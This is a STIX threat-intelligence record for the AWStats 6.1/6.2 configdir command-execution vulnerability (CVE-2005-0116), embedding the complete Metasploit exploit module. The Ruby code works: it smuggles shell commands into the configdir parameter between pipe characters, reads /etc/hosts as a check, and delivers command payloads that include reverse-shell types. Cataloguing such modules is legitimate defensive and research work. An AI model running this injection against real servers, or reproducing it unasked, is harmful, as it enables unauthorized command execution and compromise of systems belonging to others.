{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc422685-9291-485c-869c-b199e03c3dad",
    "created": "2024-08-14T17:12:44.219662Z",
    "modified": "2024-08-14T17:12:44.219666Z",
    "name": "AWStats configdir Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the AWStats CGI script. iDEFENSE has confirmed that AWStats versions 6.1 and 6.2 are vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/awstats_configdir_exec.rb",
            "external_id": "awstats_configdir_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0116"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=185&type=vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AWStats configdir Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in the\n          AWStats CGI script. iDEFENSE has confirmed that AWStats versions 6.1 and 6.2\n          are vulnerable.\n      },\n      'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-0116'],\n          ['OSVDB', '13002'],\n          ['BID', '12298'],\n          ['URL', 'http://www.idefense.com/application/poi/display?id=185&type=vulnerabilities'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby python telnet bash-tcp',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2005-01-15',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"The full URI path to awstats.pl\", \"/cgi-bin/awstats.pl\"]),\n        ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'vars_get' =>\n      {\n        'configdir' => '|echo;cat /etc/hosts;echo|'\n      }\n    }, 25)\n\n    if (res and res.body.match(/localhost/))\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    command = Rex::Text.uri_encode(payload.encoded)\n    urlconfigdir = normalize_uri(datastore['URI']) + \"?configdir=|echo;echo%20YYY;#{command};echo%20YYY;echo|\"\n\n    res = send_request_raw({\n      'uri'     => urlconfigdir,\n      'method'  => 'GET',\n      'headers' =>\n      {\n        'Connection' => 'Close',\n      }\n    }, 25)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n\n      m = res.body.match(/YYY\\n(.*)\\nYYY/m)\n\n      if (m)\n        print_status(\"Command output from the server:\")\n        print(\"\\n\" + m[1] + \"\\n\\n\")\n      else\n        print_status(\"This server may not be vulnerable\")\n      end\n    else\n      print_status(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-01-15",
    "x_mitre_platforms": [
        "unix'"
    ]
}